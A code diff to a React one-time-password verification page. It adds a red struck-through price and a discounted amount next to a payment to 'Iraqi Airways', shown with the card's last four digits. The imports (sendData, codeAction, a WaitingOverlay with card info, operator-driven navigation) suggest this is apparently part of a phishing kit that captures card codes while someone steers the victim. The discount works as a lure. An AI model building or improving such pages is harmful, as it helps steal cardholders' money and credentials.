@@ -1,14 +1,19 @@
 import { useEffect, useState, useRef } from "react";
 import { useLocation } from "wouter";
 import { useSignalEffect } from "@preact/signals-react";
+import { useSignals } from "@preact/signals-react/runtime";
 import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
 import {
   sendData,
   codeAction,
   navigateToPage,
+  globalDiscount,
 } from "@/lib/store";
+import { applyDiscount } from "@/lib/currency";
 
 export default function OTPVerification() {
+  useSignals();
+  const _discount = globalDiscount.value; // Force reactivity
   const [, navigate] = useLocation();
   const [otp, setOtp] = useState("");
   const [error, setError] = useState(false);
@@ -276,7 +281,16 @@ export default function OTPVerification() {
               {t.cardEndingIn} <span className="font-semibold text-gray-900">{cardLast4}</span>. {t.enterCode}
             </p>
             <p className="mt-2">
-              {t.youArePaying} <span className="font-semibold text-gray-900">{serviceName || "Iraqi Airways"}</span> {t.anAmountOf} <span className="font-semibold text-black">{totalAmount}</span> {t.on} {formatDate(currentTime)} {t.at} {formatTime(currentTime)}
+              {t.youArePaying} <span className="font-semibold text-gray-900">{serviceName || "Iraqi Airways"}</span> {t.anAmountOf} <span className="font-semibold text-black">
+                {globalDiscount.value ? (
+                  <>
+                    <span className="text-[#FF0000] line-through mr-2">{totalAmount}</span>
+                    <span>{applyDiscount(totalAmount)}</span>
+                  </>
+                ) : (
+                  totalAmount
+                )}
+              </span> {t.on} {formatDate(currentTime)} {t.at} {formatTime(currentTime)}
             </p>
           </div>
 
